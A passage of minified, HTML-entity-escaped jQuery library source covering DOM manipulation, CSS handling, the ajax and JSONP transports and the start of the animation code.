this.domManip(arguments,!0,function(a){this.nodeType===1&amp;&amp;this.insertBefore(a,this.firstChild)})},before:function(){if(this[0]&amp;&amp;this[0].parentNode)return this.domManip(arguments,!1,function(a){this.parentNode.insertBefore(a,this)});if(arguments.length){var a=f.clean(arguments);a.push.apply(a,this.toArray());return this.pushStack(a,&#34;before&#34;,arguments)}},after:function(){if(this[0]&amp;&amp;this[0].parentNode)return this.domManip(arguments,!1,function(a){this.parentNode.insertBefore(a,this.nextSibling)});if(arguments.length){var a=this.pushStack(this,&#34;after&#34;,arguments);a.push.apply(a,f.clean(arguments));return a}},remove:function(a,b){for(var c=0,d;(d=this[c])!=null;c++)if(!a||f.filter(a,[d]).length)!b&amp;&amp;d.nodeType===1&amp;&amp;(f.cleanData(d.getElementsByTagName(&#34;*&#34;)),f.cleanData([d])),d.parentNode&amp;&amp;d.parentNode.removeChild(d);return this},empty:function()
{for(var a=0,b;(b=this[a])!=null;a++){b.nodeType===1&amp;&amp;f.cleanData(b.getElementsByTagName(&#34;*&#34;));while(b.firstChild)b.removeChild(b.firstChild)}return this},clone:function(a,b){a=a==null?!1:a,b=b==null?a:b;return this.map(function(){return f.clone(this,a,b)})},html:function(a){if(a===b)return this[0]&amp;&amp;this[0].nodeType===1?this[0].innerHTML.replace(W,&#34;&#34;):null;if(typeof a==&#34;string&#34;&amp;&amp;!ba.test(a)&amp;&amp;(f.support.leadingWhitespace||!X.test(a))&amp;&amp;!bg[(Z.exec(a)||[&#34;&#34;,&#34;&#34;])[1].toLowerCase()]){a=a.replace(Y,&#34;&lt;$1&gt;&lt;/$2&gt;&#34;);try{for(var c=0,d=this.length;c&lt;d;c++)this[c].nodeType===1&amp;&amp;(f.cleanData(this[c].getElementsByTagName(&#34;*&#34;)),this[c].innerHTML=a)}catch(e){this.empty().append(a)}}else f.isFunction(a)?this.each(function(b){var c=f(this);c.html(a.call(this,b,c.html()))}):this.empty().append(a);return this},replaceWith:function(a){if(this[0]&amp;&amp;this[0].parentNode){if(f.isFunction(a))return this.each(function(b){var c=f(this),d=c.html();c.replaceWith(a.call(this,b,d))});typeof a!=&#34;string&#34;&amp;&amp;(a=f(a).detach());return this.each(function(){var b=this.nextSibling,c=this.parentNode;f(this).remove(),b?f(b).before(a):f(c).append(a)})}return this.length?this.pushStack(f(f.isFunction(a)?a():a),&#34;replaceWith&#34;,a):this},detach:function(a){return this.remove(a,!0)},domManip:function(a,c,d){var e,g,h,i,j=a[0],k=[];if(!f.support.checkClone&amp;&amp;arguments.length===3&amp;&amp;typeof j==&#34;string&#34;&amp;&amp;bd.test(j))return this.each(function(){f(this).domManip(a,c,d,!0)});if(f.isFunction(j))return this.each(function(e){var g=f(this);a[0]=j.call(this,e,c?g.html():b),g.domManip(a,c,d)});if(this[0]){i=j&amp;&amp;j.parentNode,f.support.parentNode&amp;&amp;i&amp;&amp;i.nodeType===11&amp;&amp;i.childNodes.length===this.length?e={fragment:i}:e=f.buildFragment(a,this,k),h=e.fragment,h.childNodes.length===1?g=h=h.firstChild:g=h.firstChild;if(g){c=c&amp;&amp;f.nodeName(g,&#34;tr&#34;);for(var l=0,m=this.length,n=m-1;l&lt;m;l++)d.call(c?bi(this[l],g):this[l],e.cacheable||m&gt;1&amp;&amp;l&lt;n?f.clone(h,!0,!0):h)}k.length&amp;&amp;f.each(k,bp)}return this}}),f.buildFragment=function(a,b,d){var e,g,h,i,j=a[0];b&amp;&amp;b[0]&amp;&amp;(i=b[0].ownerDocument||b[0]),i.createDocumentFragment||(i=c),a.length===1&amp;&amp;typeof j==&#34;string&#34;&amp;&amp;j.length&lt;512&amp;&amp;i===c&amp;&amp;j.charAt(0)===&#34;&lt;&#34;&amp;&amp;!bb.test(j)&amp;&amp;(f.support.checkClone||!bd.test(j))&amp;&amp;(f.support.html5Clone||!bc.test(j))&amp;&amp;(g=!0,h=f.fragments[j],h&amp;&amp;h!==1&amp;&amp;(e=h)),e||(e=i.createDocumentFragment(),f.clean(a,i,e,d)),g&amp;&amp;(f.fragments[j]=h?e:1);return{fragment:e,cacheable:g}},f.fragments={},f.each({appendTo:&#34;append&#34;,prependTo:&#34;prepend&#34;,insertBefore:&#34;before&#34;,insertAfter:&#34;after&#34;,replaceAll:&#34;replaceWith&#34;},function(a,b){f.fn[a]=function(c){var d=[],e=f(c),g=this.length===1&amp;&amp;this[0].parentNode;if(g&amp;&amp;g.nodeType===11&amp;&amp;g.childNodes.length===1&amp;&amp;e.length===1){e[b](this[0]);return this}for(var h=0,i=e.length;h&lt;i;h++){var j=(h&gt;0?this.clone(!0):this).get();f(e[h])[b](j),d=d.concat(j)}return this.pushStack(d,a,e.selector)}}),f.extend({clone:function(a,b,c){var d,e,g,h=f.support.html5Clone||!bc.test(&#34;&lt;&#34;+a.nodeName)?a.cloneNode(!0):bo(a);if((!f.support.noCloneEvent||!f.support.noCloneChecked)&amp;&amp;(a.nodeType===1||a.nodeType===11)&amp;&amp;!f.isXMLDoc(a)){bk(a,h),d=bl(a),e=bl(h);for(g=0;d[g];++g)e[g]&amp;&amp;bk(d[g],e[g])}if(b){bj(a,h);if(c){d=bl(a),e=bl(h);for(g=0;d[g];++g)bj(d[g],e[g])}}d=e=null;return h},clean:function(a,b,d,e){var g;b=b||c,typeof b.createElement==&#34;undefined&#34;&amp;&amp;(b=b.ownerDocument||b[0]&amp;&amp;b[0].ownerDocument||c);var h=[],i;for(var j=0,k;(k=a[j])!=null;j++){typeof k==&#34;number&#34;&amp;&amp;(k+=&#34;&#34;);if(!k)continue;if(typeof k==&#34;string&#34;)if(!_.test(k))k=b.createTextNode(k);else{k=k.replace(Y,&#34;&lt;$1&gt;&lt;/$2&gt;&#34;);var l=(Z.exec(k)||[&#34;&#34;,&#34;&#34;])[1].toLowerCase(),m=bg[l]||bg._default,n=m[0],o=b.createElement(&#34;div&#34;);b===c?bh.appendChild(o):U(b).appendChild(o),o.innerHTML=m[1]+k+m[2];while(n--)o=o.lastChild;if(!f.support.tbody){var p=$.test(k),q=l===&#34;table&#34;&amp;&amp;!p?o.firstChild&amp;&amp;o.firstChild.childNodes:m[1]===&#34;&lt;table&gt;&#34;&amp;&amp;!p?o.childNodes:[];for(i=q.length-1;i&gt;=0;--i)f.nodeName(q[i],&#34;tbody&#34;)&amp;&amp;!q[i].childNodes.length&amp;&amp;q[i].parentNode.removeChild(q[i])}!f.support.leadingWhitespace&amp;&amp;X.test(k)&amp;&amp;o.insertBefore(b.createTextNode(X.exec(k)[0]),o.firstChild),k=o.childNodes}var r;if(!f.support.appendChecked)if(k[0]&amp;&amp;typeof (r=k.length)==&#34;number&#34;)for(i=0;i&lt;r;i++)bn(k[i]);else bn(k);k.nodeType?h.push(k):h=f.merge(h,k)}if(d){g=function(a){return!a.type||be.test(a.type)};for(j=0;h[j];j++)if(e&amp;&amp;f.nodeName(h[j],&#34;script&#34;)&amp;&amp;(!h[j].type||h[j].type.toLowerCase()===&#34;text/javascript&#34;))e.push(h[j].parentNode?h[j].parentNode.removeChild(h[j]):h[j]);else{if(h[j].nodeType===1){var s=f.grep(h[j].getElementsByTagName(&#34;script&#34;),g);h.splice.apply(h,[j+1,0].concat(s))}d.appendChild(h[j])}}return h},cleanData:function(a){var b,c,d=f.cache,e=f.event.special,g=f.support.deleteExpando;for(var h=0,i;(i=a[h])!=null;h++){if(i.nodeName&amp;&amp;f.noData[i.nodeName.toLowerCase()])continue;c=i[f.expando];if(c){b=d[c];if(b&amp;&amp;b.events){for(var j in b.events)e[j]?f.event.remove(i,j):f.removeEvent(i,j,b.handle);b.handle&amp;&amp;(b.handle.elem=null)}g?delete i[f.expando]:i.removeAttribute&amp;&amp;i.removeAttribute(f.expando),delete d[c]}}}});var bq=/alpha\([^)]*\)/i,br=/opacity=([^)]*)/,bs=/([A-Z]|^ms)/g,bt=/^-?\d+(?:px)?$/i,bu=/^-?\d/,bv=/^([\-+])=([\-+.\de]+)/,bw={position:&#34;absolute&#34;,visibility:&#34;hidden&#34;,display:&#34;block&#34;},bx=[&#34;Left&#34;,&#34;Right&#34;],by=[&#34;Top&#34;,&#34;Bottom&#34;],bz,bA,bB;f.fn.css=function(a,c){if(arguments.length===2&amp;&amp;c===b)return this;return f.access(this,a,c,!0,function(a,c,d){return d!==b?f.style(a,c,d):f.css(a,c)})},f.extend({cssHooks:{opacity:{get:function(a,b){if(b){var c=bz(a,&#34;opacity&#34;,&#34;opacity&#34;);return c===&#34;&#34;?&#34;1&#34;:c}return a.style.opacity}}},cssNumber:{fillOpacity:!0,fontWeight:!0,lineHeight:!0,opacity:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{&#34;float&#34;:f.support.cssFloat?&#34;cssFloat&#34;:&#34;styleFloat&#34;},style:function(a,c,d,e){if(!!a&amp;&amp;a.nodeType!==3&amp;&amp;a.nodeType!==8&amp;&amp;!!a.style){var g,h,i=f.camelCase(c),j=a.style,k=f.cssHooks[i];c=f.cssProps[i]||i;if(d===b){if(k&amp;&amp;&#34;get&#34;in k&amp;&amp;(g=k.get(a,!1,e))!==b)return g;return j[c]}h=typeof d,h===&#34;string&#34;&amp;&amp;(g=bv.exec(d))&amp;&amp;(d=+(g[1]+1)*+g[2]+parseFloat(f.css(a,c)),h=&#34;number&#34;);if(d==null||h===&#34;number&#34;&amp;&amp;isNaN(d))return;h===&#34;number&#34;&amp;&amp;!f.cssNumber[i]&amp;&amp;(d+=&#34;px&#34;);if(!k||!(&#34;set&#34;in k)||(d=k.set(a,d))!==b)try{j[c]=d}catch(l){}}},css:function(a,c,d){var e,g;c=f.camelCase(c),g=f.cssHooks[c],c=f.cssProps[c]||c,c===&#34;cssFloat&#34;&amp;&amp;(c=&#34;float&#34;);if(g&amp;&amp;&#34;get&#34;in g&amp;&amp;(e=g.get(a,!0,d))!==b)return e;if(bz)return bz(a,c)},swap:function(a,b,c){var d={};for(var e in b)d[e]=a.style[e],a.style[e]=b[e];c.call(a);for(e in b)a.style[e]=d[e]}}),f.curCSS=f.css,f.each([&#34;height&#34;,&#34;width&#34;],function(a,b){f.cssHooks[b]={get:function(a,c,d){var e;if(c){if(a.offsetWidth!==0)return bC(a,b,d);f.swap(a,bw,function(){e=bC(a,b,d)});return e}},set:function(a,b){if(!bt.test(b))return b;b=parseFloat(b);if(b&gt;=0)return b+&#34;px&#34;}}}),f.support.opacity||(f.cssHooks.opacity={get:function(a,b){return br.test((b&amp;&amp;a.currentStyle?a.currentStyle.filter:a.style.filter)||&#34;&#34;)?parseFloat(RegExp.$1)/100+&#34;&#34;:b?&#34;1&#34;:&#34;&#34;},set:function(a,b){var c=a.style,d=a.currentStyle,e=f.isNumeric(b)?&#34;alpha(opacity=&#34;+b*100+&#34;)&#34;:&#34;&#34;,g=d&amp;&amp;d.filter||c.filter||&#34;&#34;;c.zoom=1;if(b&gt;=1&amp;&amp;f.trim(g.replace(bq,&#34;&#34;))===&#34;&#34;){c.removeAttribute(&#34;filter&#34;);if(d&amp;&amp;!d.filter)return}c.filter=bq.test(g)?g.replace(bq,e):g+&#34; &#34;+e}}),f(function(){f.support.reliableMarginRight||(f.cssHooks.marginRight={get:function(a,b){var c;f.swap(a,{display:&#34;inline-block&#34;},function(){b?c=bz(a,&#34;margin-right&#34;,&#34;marginRight&#34;):c=a.style.marginRight});return c}})}),c.defaultView&amp;&amp;c.defaultView.getComputedStyle&amp;&amp;(bA=function(a,b){var c,d,e;b=b.replace(bs,&#34;-$1&#34;).toLowerCase(),(d=a.ownerDocument.defaultView)&amp;&amp;(e=d.getComputedStyle(a,null))&amp;&amp;(c=e.getPropertyValue(b),c===&#34;&#34;&amp;&amp;!f.contains(a.ownerDocument.documentElement,a)&amp;&amp;(c=f.style(a,b)));return c}),c.documentElement.currentStyle&amp;&amp;(bB=function(a,b){var c,d,e,f=a.currentStyle&amp;&amp;a.currentStyle[b],g=a.style;f===null&amp;&amp;g&amp;&amp;(e=g[b])&amp;&amp;(f=e),!bt.test(f)&amp;&amp;bu.test(f)&amp;&amp;(c=g.left,d=a.runtimeStyle&amp;&amp;a.runtimeStyle.left,d&amp;&amp;(a.runtimeStyle.left=a.currentStyle.left),g.left=b===&#34;fontSize&#34;?&#34;1em&#34;:f||0,f=g.pixelLeft+&#34;px&#34;,g.left=c,d&amp;&amp;(a.runtimeStyle.left=d));return f===&#34;&#34;?&#34;auto&#34;:f}),bz=bA||bB,f.expr&amp;&amp;f.expr.filters&amp;&amp;(f.expr.filters.hidden=function(a){var b=a.offsetWidth,c=a.offsetHeight;return b===0&amp;&amp;c===0||!f.support.reliableHiddenOffsets&amp;&amp;(a.style&amp;&amp;a.style.display||f.css(a,&#34;display&#34;))===&#34;none&#34;},f.expr.filters.visible=function(a){return!f.expr.filters.hidden(a)});var bD=/%20/g,bE=/\[\]$/,bF=/\r?\n/g,bG=/#.*$/,bH=/^(.*?):[ \t]*([^\r\n]*)\r?$/mg,bI=/^(?:color|date|datetime|datetime-local|email|hidden|month|number|password|range|search|tel|text|time|url|week)$/i,bJ=/^(?:about|app|app\-storage|.+\-extension|file|res|widget):$/,bK=/^(?:GET|HEAD)$/,bL=/^\/\//,bM=/\?/,bN=/&lt;script\b[^&lt;]*(?:(?!&lt;\/script&gt;)&lt;[^&lt;]*)*&lt;\/script&gt;/gi,bO=/^(?:select|textarea)/i,bP=/\s+/,bQ=/([?&amp;])_=[^&amp;]*/,bR=/^([\w\+\.\-]+:)(?:\/\/([^\/?#:]*)(?::(\d+))?)?/,bS=f.fn.load,bT={},bU={},bV,bW,bX=[&#34;*/&#34;]+[&#34;*&#34;];try{bV=e.href}catch(bY){bV=c.createElement(&#34;a&#34;),bV.href=&#34;&#34;,bV=bV.href}bW=bR.exec(bV.toLowerCase())||[],f.fn.extend({load:function(a,c,d){if(typeof a!=&#34;string&#34;&amp;&amp;bS)return bS.apply(this,arguments);if(!this.length)return this;var e=a.indexOf(&#34; &#34;);if(e&gt;=0){var g=a.slice(e,a.length);a=a.slice(0,e)}var h=&#34;GET&#34;;c&amp;&amp;(f.isFunction(c)?(d=c,c=b):typeof c==&#34;object&#34;&amp;&amp;(c=f.param(c,f.ajaxSettings.traditional),h=&#34;POST&#34;));var i=this;f.ajax({url:a,type:h,dataType:&#34;html&#34;,data:c,complete:function(a,b,c){c=a.responseText,a.isResolved()&amp;&amp;(a.done(function(a){c=a}),i.html(g?f(&#34;&lt;div&gt;&#34;).append(c.replace(bN,&#34;&#34;)).find(g):c)),d&amp;&amp;i.each(d,[c,b,a])}});return this},serialize:function(){return f.param(this.serializeArray())},serializeArray:function(){return this.map(function(){return this.elements?f.makeArray(this.elements):this}).filter(function(){return this.name&amp;&amp;!this.disabled&amp;&amp;(this.checked||bO.test(this.nodeName)||bI.test(this.type))}).map(function(a,b){var c=f(this).val();return c==null?null:f.isArray(c)?f.map(c,function(a,c){return{name:b.name,value:a.replace(bF,&#34;\r\n&#34;)}}):{name:b.name,value:c.replace(bF,&#34;\r\n&#34;)}}).get()}}),f.each(&#34;ajaxStart ajaxStop ajaxComplete ajaxError ajaxSuccess ajaxSend&#34;.split(&#34; &#34;),function(a,b){f.fn[b]=function(a){return this.on(b,a)}}),f.each([&#34;get&#34;,&#34;post&#34;],function(a,c){f[c]=function(a,d,e,g){f.isFunction(d)&amp;&amp;(g=g||e,e=d,d=b);return f.ajax({type:c,url:a,data:d,success:e,dataType:g})}}),f.extend({getScript:function(a,c){return f.get(a,b,c,&#34;script&#34;)},getJSON:function(a,b,c){return f.get(a,b,c,&#34;json&#34;)},ajaxSetup:function(a,b){b?b_(a,f.ajaxSettings):(b=a,a=f.ajaxSettings),b_(a,b);return a},ajaxSettings:{url:bV,isLocal:bJ.test(bW[1]),global:!0,type:&#34;GET&#34;,contentType:&#34;application/x-www-form-urlencoded&#34;,processData:!0,async:!0,accepts:{xml:&#34;application/xml, text/xml&#34;,html:&#34;text/html&#34;,text:&#34;text/plain&#34;,json:&#34;application/json, text/javascript&#34;,&#34;*&#34;:bX},contents:{xml:/xml/,html:/html/,json:/json/},responseFields:{xml:&#34;responseXML&#34;,text:&#34;responseText&#34;},converters:{&#34;* text&#34;:a.String,&#34;text html&#34;:!0,&#34;text json&#34;:f.parseJSON,&#34;text xml&#34;:f.parseXML},flatOptions:{context:!0,url:!0}},ajaxPrefilter:bZ(bT),ajaxTransport:bZ(bU),ajax:function(a,c){function w(a,c,l,m){if(s!==2){s=2,q&amp;&amp;clearTimeout(q),p=b,n=m||&#34;&#34;,v.readyState=a&gt;0?4:0;var o,r,u,w=c,x=l?cb(d,v,l):b,y,z;if(a&gt;=200&amp;&amp;a&lt;300||a===304){if(d.ifModified){if(y=v.getResponseHeader(&#34;Last-Modified&#34;))f.lastModified[k]=y;if(z=v.getResponseHeader(&#34;Etag&#34;))f.etag[k]=z}if(a===304)w=&#34;notmodified&#34;,o=!0;else try{r=cc(d,x),w=&#34;success&#34;,o=!0}catch(A){w=&#34;parsererror&#34;,u=A}}else{u=w;if(!w||a)w=&#34;error&#34;,a&lt;0&amp;&amp;(a=0)}v.status=a,v.statusText=&#34;&#34;+(c||w),o?h.resolveWith(e,[r,w,v]):h.rejectWith(e,[v,w,u]),v.statusCode(j),j=b,t&amp;&amp;g.trigger(&#34;ajax&#34;+(o?&#34;Success&#34;:&#34;Error&#34;),[v,d,o?r:u]),i.fireWith(e,[v,w]),t&amp;&amp;(g.trigger(&#34;ajaxComplete&#34;,[v,d]),--f.active||f.event.trigger(&#34;ajaxStop&#34;))}}typeof a==&#34;object&#34;&amp;&amp;(c=a,a=b),c=c||{};var d=f.ajaxSetup({},c),e=d.context||d,g=e!==d&amp;&amp;(e.nodeType||e instanceof f)?f(e):f.event,h=f.Deferred(),i=f.Callbacks(&#34;once memory&#34;),j=d.statusCode||{},k,l={},m={},n,o,p,q,r,s=0,t,u,v={readyState:0,setRequestHeader:function(a,b){if(!s){var c=a.toLowerCase();a=m[c]=m[c]||a,l[a]=b}return this},getAllResponseHeaders:function(){return s===2?n:null},getResponseHeader:function(a){var c;if(s===2){if(!o){o={};while(c=bH.exec(n))o[c[1].toLowerCase()]=c[2]}c=o[a.toLowerCase()]}return c===b?null:c},overrideMimeType:function(a){s||(d.mimeType=a);return this},abort:function(a){a=a||&#34;abort&#34;,p&amp;&amp;p.abort(a),w(0,a);return this}};h.promise(v),v.success=v.done,v.error=v.fail,v.complete=i.add,v.statusCode=function(a){if(a){var b;if(s&lt;2)for(b in a)j[b]=[j[b],a[b]];else b=a[v.status],v.then(b,b)}return this},d.url=((a||d.url)+&#34;&#34;).replace(bG,&#34;&#34;).replace(bL,bW[1]+&#34;//&#34;),d.dataTypes=f.trim(d.dataType||&#34;*&#34;).toLowerCase().split(bP),d.crossDomain==null&amp;&amp;(r=bR.exec(d.url.toLowerCase()),d.crossDomain=!(!r||r[1]==bW[1]&amp;&amp;r[2]==bW[2]&amp;&amp;(r[3]||(r[1]===&#34;http:&#34;?80:443))==(bW[3]||(bW[1]===&#34;http:&#34;?80:443)))),d.data&amp;&amp;d.processData&amp;&amp;typeof d.data!=&#34;string&#34;&amp;&amp;(d.data=f.param(d.data,d.traditional)),b$(bT,d,c,v);if(s===2)return!1;t=d.global,d.type=d.type.toUpperCase(),d.hasContent=!bK.test(d.type),t&amp;&amp;f.active++===0&amp;&amp;f.event.trigger(&#34;ajaxStart&#34;);if(!d.hasContent){d.data&amp;&amp;(d.url+=(bM.test(d.url)?&#34;&amp;&#34;:&#34;?&#34;)+d.data,delete d.data),k=d.url;if(d.cache===!1){var x=f.now(),y=d.url.replace(bQ,&#34;$1_=&#34;+x);d.url=y+(y===d.url?(bM.test(d.url)?&#34;&amp;&#34;:&#34;?&#34;)+&#34;_=&#34;+x:&#34;&#34;)}}(d.data&amp;&amp;d.hasContent&amp;&amp;d.contentType!==!1||c.contentType)&amp;&amp;v.setRequestHeader(&#34;Content-Type&#34;,d.contentType),d.ifModified&amp;&amp;(k=k||d.url,f.lastModified[k]&amp;&amp;v.setRequestHeader(&#34;If-Modified-Since&#34;,f.lastModified[k]),f.etag[k]&amp;&amp;v.setRequestHeader(&#34;If-None-Match&#34;,f.etag[k])),v.setRequestHeader(&#34;Accept&#34;,d.dataTypes[0]&amp;&amp;d.accepts[d.dataTypes[0]]?d.accepts[d.dataTypes[0]]+(d.dataTypes[0]!==&#34;*&#34;?&#34;, &#34;+bX+&#34;; q=0.01&#34;:&#34;&#34;):d.accepts[&#34;*&#34;]);for(u in d.headers)v.setRequestHeader(u,d.headers[u]);if(d.beforeSend&amp;&amp;(d.beforeSend.call(e,v,d)===!1||s===2)){v.abort();return!1}for(u in{success:1,error:1,complete:1})v[u](d[u]);p=b$(bU,d,c,v);if(!p)w(-1,&#34;No Transport&#34;);else{v.readyState=1,t&amp;&amp;g.trigger(&#34;ajaxSend&#34;,[v,d]),d.async&amp;&amp;d.timeout&gt;0&amp;&amp;(q=setTimeout(function(){v.abort(&#34;timeout&#34;)},d.timeout));try{s=1,p.send(l,w)}catch(z){if(s&lt;2)w(-1,z);else throw z}}return v},param:function(a,c){var d=[],e=function(a,b){b=f.isFunction(b)?b():b,d[d.length]=encodeURIComponent(a)+&#34;=&#34;+encodeURIComponent(b)};c===b&amp;&amp;(c=f.ajaxSettings.traditional);if(f.isArray(a)||a.jquery&amp;&amp;!f.isPlainObject(a))f.each(a,function(){e(this.name,this.value)});else for(var g in a)ca(g,a[g],c,e);return d.join(&#34;&amp;&#34;).replace(bD,&#34;+&#34;)}}),f.extend({active:0,lastModified:{},etag:{}});var cd=f.now(),ce=/(\=)\?(&amp;|$)|\?\?/i;f.ajaxSetup({jsonp:&#34;callback&#34;,jsonpCallback:function(){return f.expando+&#34;_&#34;+cd++}}),f.ajaxPrefilter(&#34;json jsonp&#34;,function(b,c,d){var e=b.contentType===&#34;application/x-www-form-urlencoded&#34;&amp;&amp;typeof b.data==&#34;string&#34;;if(b.dataTypes[0]===&#34;jsonp&#34;||b.jsonp!==!1&amp;&amp;(ce.test(b.url)||e&amp;&amp;ce.test(b.data))){var g,h=b.jsonpCallback=f.isFunction(b.jsonpCallback)?b.jsonpCallback():b.jsonpCallback,i=a[h],j=b.url,k=b.data,l=&#34;$1&#34;+h+&#34;$2&#34;;b.jsonp!==!1&amp;&amp;(j=j.replace(ce,l),b.url===j&amp;&amp;(e&amp;&amp;(k=k.replace(ce,l)),b.data===k&amp;&amp;(j+=(/\?/.test(j)?&#34;&amp;&#34;:&#34;?&#34;)+b.jsonp+&#34;=&#34;+h))),b.url=j,b.data=k,a[h]=function(a){g=[a]},d.always(function(){a[h]=i,g&amp;&amp;f.isFunction(i)&amp;&amp;a[h](g[0])}),b.converters[&#34;script json&#34;]=function(){g||f.error(h+&#34; was not called&#34;);return g[0]},b.dataTypes[0]=&#34;json&#34;;return&#34;script&#34;}}),f.ajaxSetup({accepts:{script:&#34;text/javascript, application/javascript, application/ecmascript, application/x-ecmascript&#34;},contents:{script:/javascript|ecmascript/},converters:{&#34;text script&#34;:function(a){f.globalEval(a);return a}}}),f.ajaxPrefilter(&#34;script&#34;,function(a){a.cache===b&amp;&amp;(a.cache=!1),a.crossDomain&amp;&amp;(a.type=&#34;GET&#34;,a.global=!1)}),f.ajaxTransport(&#34;script&#34;,function(a){if(a.crossDomain){var d,e=c.head||c.getElementsByTagName(&#34;head&#34;)[0]||c.documentElement;return{send:function(f,g){d=c.createElement(&#34;script&#34;),d.async=&#34;async&#34;,a.scriptCharset&amp;&amp;(d.charset=a.scriptCharset),d.src=a.url,d.onload=d.onreadystatechange=function(a,c){if(c||!d.readyState||/loaded|complete/.test(d.readyState))d.onload=d.onreadystatechange=null,e&amp;&amp;d.parentNode&amp;&amp;e.removeChild(d),d=b,c||g(200,&#34;success&#34;)},e.insertBefore(d,e.firstChild)},abort:function(){d&amp;&amp;d.onload(0,1)}}}});var cf=a.ActiveXObject?function(){for(var a in ch)ch[a](0,1)}:!1,cg=0,ch;f.ajaxSettings.xhr=a.ActiveXObject?function(){return!this.isLocal&amp;&amp;ci()||cj()}:ci,function(a){f.extend(f.support,{ajax:!!a,cors:!!a&amp;&amp;&#34;withCredentials&#34;in a})}(f.ajaxSettings.xhr()),f.support.ajax&amp;&amp;f.ajaxTransport(function(c){if(!c.crossDomain||f.support.cors){var d;return{send:function(e,g){var h=c.xhr(),i,j;c.username?h.open(c.type,c.url,c.async,c.username,c.password):h.open(c.type,c.url,c.async);if(c.xhrFields)for(j in c.xhrFields)h[j]=c.xhrFields[j];c.mimeType&amp;&amp;h.overrideMimeType&amp;&amp;h.overrideMimeType(c.mimeType),!c.crossDomain&amp;&amp;!e[&#34;X-Requested-With&#34;]&amp;&amp;(e[&#34;X-Requested-With&#34;]=&#34;XMLHttpRequest&#34;);try{for(j in e)h.setRequestHeader(j,e[j])}catch(k){}h.send(c.hasContent&amp;&amp;c.data||null),d=function(a,e){var j,k,l,m,n;try{if(d&amp;&amp;(e||h.readyState===4)){d=b,i&amp;&amp;(h.onreadystatechange=f.noop,cf&amp;&amp;delete ch[i]);if(e)h.readyState!==4&amp;&amp;h.abort();else{j=h.status,l=h.getAllResponseHeaders(),m={},n=h.responseXML,n&amp;&amp;n.documentElement&amp;&amp;(m.xml=n),m.text=h.responseText;try{k=h.statusText}catch(o){k=&#34;&#34;}!j&amp;&amp;c.isLocal&amp;&amp;!c.crossDomain?j=m.text?200:404:j===1223&amp;&amp;(j=204)}}}catch(p){e||g(-1,p)}m&amp;&amp;g(j,k,m,l)},!c.async||h.readyState===4?d():(i=++cg,cf&amp;&amp;(ch||(ch={},f(a).unload(cf)),ch[i]=d),h.onreadystatechange=d)},abort:function(){d&amp;&amp;d(0,1)}}}});var ck={},cl,cm,cn=/^(?:toggle|show|hide)$/,co=/^([+\-]=)?([\d+.\-]+)([a-z%]*)$/i,cp,cq=[[&#34;height&#34;,&#34;marginTop&#34;,&#34;marginBottom&#34;,&#34;paddingTop&#34;,&#34;paddingBottom&#34;],[&#34;width&#34;,&#34;marginLeft&#34;,&#34;marginRight&#34;,&#34;paddingLeft&#34;,&#34;paddingRight&#34;],[&#34;opacity&#34;]],cr;f.fn.extend({show:function(a,b,c){var d,e;if(a||a===0)return this.animate(cu(&#34;show&#34;,3),a,b,c);for(var g=0,h=this.length;g&lt;h;g++)d=this[g],d.style&amp;&amp;(e=d.style.display,!f._data(d,&#34;olddisplay&#34;)&amp;&amp;e===&#34;none&#34;&amp;&amp;(e=d.style.display=&#34;&#34;),e===&#34;&#34;&amp;&amp;f.css(d,&#34;display&#34;)===&#34;none&#34;&amp;&amp;f._data(d,&#34;olddisplay&#34;,cv(d.nodeName)));for(g=0;g&lt;h;g++){d=this[g];if(d.style){e=d.style.display;if(e===&#34;&#34;||e===&#34;none&#34;)d.style.display=f._data(d,&#34;olddisplay&#34;)||&#34;&#34;}}return this},hide:function(a,b,c){if(a||a===0)return this.animate(cu(&#34;hide&#34;,3),a,b,c);var d,e,g=0,h=this.length;for(;g&lt;h;g++)d=this[g],d.style&amp;&amp;(e=f.css(d,&#34;display&#34;),e!==&#34;none&#34;&amp;&amp;!f._data(d,&#34;olddisplay&#34;)&amp;&amp;f._data(d,&#34;olddisplay&#34;,e));for(g=0;g&lt;h;g++)this[g].style&amp;&amp;(this[g].style.display=&#34;none&#34;);return this},_toggle:f.fn.toggle,toggle:function(a,b,c){var d=typeof a==&#34;boolean&#34;;f.isFunction(a)&amp;&amp;f.isFunction(b)?this._toggle.apply(this,arguments):a==null||d?this.each(function(){var b=d?a:f(this).is(&#34;:hidden&#34;);f(this)[b?&#34;show&#34;:&#34;hide&#34;]()}):this.animate(cu(&#34;toggle&#34;,3),a,b,c);return this},fadeTo:function(a,b,c,d){return this.filter(&#34;:hidden&#34;).css(&#34;opacity&#34;,0).show().end().animate({opacity:b},a,c,d)},animate:function(a,b,c,d){function g(){e.queue===!1&amp;&amp;f._mark(this);var b=f.extend({},e),c=this.nodeType===1,d=c&amp;&amp;f(this).is(&#34;:hidden&#34;),g,h,i,j,k,l,m,n,o;b.animatedProperties={};for(i in a){g=f.camelCase(i),i!==g&amp;&amp;(a[g]=a[i],delete a[i]),h=a[g],f.isArray(h)?(b.animatedProperties[g]=h[1],h=a[g]=h[0]):b.animatedProperties[g]=b.specialEasing&amp;&amp;b.specialEasing[g]||b.easing||&#34;swing&#34;;if(h===&#34;hide&#34;&amp;&amp;d||h===&#34;show&#34;&amp;&amp;!d)return b.complete.call(this);c&amp;&amp;(g===&#34;height&#34;||g===&#34;width&#34;)&amp;&amp;(b.overflow=[this.style.overflow,this.style.overflowX,this.style.overflowY],f.css(this,&#34;display&#34;)===&#34;inline&#34;&amp;&amp;f.css(this,&#34;float&#34;)===&#34;none&#34;&amp;&amp;(!f.support.inlineBlockNeedsLayout||cv(this.nodeName)===&#34;inline&#34;?this.style.display=&#34;inline-block&#34;:this.style.zoom=1))}b.overflow!=null&amp;&amp;(this.style.overflow=&#34;hidden&#34;);for(i in a)j=new f.fx(this,b,i),h=a[i],cn.test(h)?(o=f._data(this,&#34;toggle&#34;+i)||(h===&#34;toggle&#34;?d?&#34;show&#34;:&#34;hide&#34;:0),o?(f._data(this,&#34;toggle&#34;+i,o===&#34;show&#34;?&#34;hide&#34;:&#34;show&#34;),j[o]()):j[h]()):(k=co.exec(h),l=j.cur(),k?(m=parseFloat(k[2]),n=k[3]||(f.cssNumber[i]?&#34;&#34;:&#34;px&#34;),n!==&#34;px&#34;&amp;&amp;(f.style(this,i,(m||1)+n),l=(m||1)/j.cur()*l,f.style(this,i,l+n)),k[1]&amp;&amp;(m=(k[1]===&#34;-=&#34;?-1:1)*m+l),j.custom(l,m,n)):j.custom(l,h,&#34;&#34;));return!0}var 